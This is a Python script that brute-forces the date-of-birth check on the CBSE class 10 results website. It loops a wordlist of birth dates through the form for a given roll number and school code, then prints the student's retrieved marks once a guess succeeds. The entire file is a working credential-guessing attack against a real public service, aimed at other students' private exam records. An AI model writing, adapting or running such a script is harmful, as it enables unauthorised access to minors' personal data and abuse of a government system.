import requests
import sys
from bs4 import BeautifulSoup

url = "http://cbseresults.nic.in/class10/class10th21.asp"
headers = {
    "Host": "cbseresults.nic.in",
    "Referer": "http://cbseresults.nic.in/class10/Class10th21.htm",
    "Content-Type": "application/x-www-form-urlencoded",
}

expression = "ENGLISH" # This should be any subject that you have eg. ENGLISH as shown on CBSE website
sch = '25193' # CHANGE HERE

def brute(dob, regno):
    data = {
        'regno': regno,
        'sch': sch,
        'dob': dob,
        'B2': 'Submit',
        }
    r = requests.post(url, headers=headers, data=data)
    if expression in r.text:
        return r.text


def user(regno):
    words = [w.strip() for w in open('dob1.txt', 'rb').readlines()]
    for word in words:
        word = word.decode('utf-8')
        dob = word
        print(dob)
        content = brute(dob, regno)
        if content:
            break
    return content


def main():
    print('Starting')
    roll = str(sys.argv[1]).strip()
    print(roll)
    c = user(roll)
    if c:
        soup = BeautifulSoup(c, 'html.parser')
        text = soup.get_text()
        text = text[text.find('Roll No:'
                              ):text.find('Check Another Result')]
        print(text.rstrip('\n').replace('  ', ''))
    else:
        print('Could not find score(An error may have occurred, Please try again)')


if __name__ == '__main__':
    main()